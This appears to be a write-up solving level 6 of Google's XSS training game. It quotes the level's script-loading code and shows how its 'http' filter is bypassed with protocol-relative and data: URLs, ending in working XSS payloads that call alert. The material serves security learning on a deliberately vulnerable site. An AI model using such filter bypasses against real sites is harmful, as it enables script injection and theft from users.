@@ -1,0 +1,102 @@
+ https://xss-game.appspot.com/level6
+ 
+ 
+ <head>
+    <!-- Internal game scripts/styles, mostly boring stuff -->
+    <script src="/static/game-frame.js"></script>
+    <link rel="stylesheet" href="/static/game-frame-styles.css" />
+ 
+    <script>
+    function setInnerText(element, value) {
+      if (element.innerText) {
+        element.innerText = value;
+      } else {
+        element.textContent = value;
+      }
+    }
+ 
+    function includeGadget(url) {
+      var scriptEl = document.createElement('script');
+ 
+      // This will totally prevent us from loading evil URLs!
+      if (url.match(/^https?:\/\//)) {
+        setInnerText(document.getElementById("log"),
+          "Sorry, cannot load a URL containing \"http\".");
+        return;
+      }
+      // Load this awesome gadget
+      scriptEl.src = url;
+ 
+ 
+ 
+ The key part of the code is:
+
+function includeGadget(url) {
+  var scriptEl = document.createElement('script');
+
+  // This will totally prevent us from loading evil URLs!
+  if (url.match(/^https?:\/\//)) {
+    setInnerText(document.getElementById("log"),
+      "Sorry, cannot load a URL containing \"http\".");
+    return;
+  }
+
+  scriptEl.src = url;
+  ...
+  document.head.appendChild(scriptEl);
+}
+
+
+
+
+🚨 What is happening here?
+
+The url is extracted from the fragment (#...) via:
+
+return window.location.hash.substr(1)
+
+
+It checks if the URL starts with http:// or https://
+
+If it does → it gets blocked
+
+Otherwise, it dynamically creates a <script src="..."> tag
+
+🧪 The Bypass Trick
+✅ Hint 2: “Is the security check really foolproof?”
+
+Nope. It only blocks URLs starting with http via:
+
+url.match(/^https?:\/\//)
+
+
+But if you can insert a script tag pointing to a valid JavaScript file that doesn’t include "http" at the start — it gets loaded.
+
+The trick is: use a known JavaScript endpoint that doesn't start with http://.
+
+🔥 Hint 4: “See if google.com/jsapi?callback=foo helps”
+
+Google’s jsapi endpoint is known to allow callback-based loading, meaning:
+
+<script src="//www.google.com/jsapi?callback=alert(1)"></script>
+
+
+This will call alert(1) after the script loads.
+
+And the trick here is:
+
+//www.google.com/... is a valid script source
+
+It does not start with http:// or https://
+
+But the browser interprets it as a protocol-relative URL and loads it using HTTPS.
+
+
+
+✅ Working Exploit
+
+Try this in the URL:
+
+https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
+or
+https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('')
